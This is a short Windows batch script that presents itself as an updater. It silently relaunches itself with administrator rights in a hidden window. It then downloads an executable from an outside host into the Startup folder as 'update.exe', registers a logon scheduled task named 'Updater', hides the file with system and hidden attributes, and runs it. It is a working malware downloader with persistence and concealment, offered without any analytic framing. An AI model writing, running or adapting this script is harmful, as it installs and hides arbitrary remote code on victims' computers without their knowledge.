@echo off
openfiles >nul 2>&1
if %errorlevel% neq 0 (
    powershell -Command "Start-Process cmd -ArgumentList '/c, \"%~f0\"' -Verb runAs -WindowStyle Hidden"
    exit /b
)
powershell -Command "iwr 'https://server.api/file' -OutFile '%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\update.exe'"
schtasks /create /tn "Updater" /sc onlogon /tr "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\SYSTEM.exe" /ru %USERNAME% /f
schtasks /run /tn "Updater"
attrib +h +s +r "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\update.exe"
"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\update.exe"
exit /b 0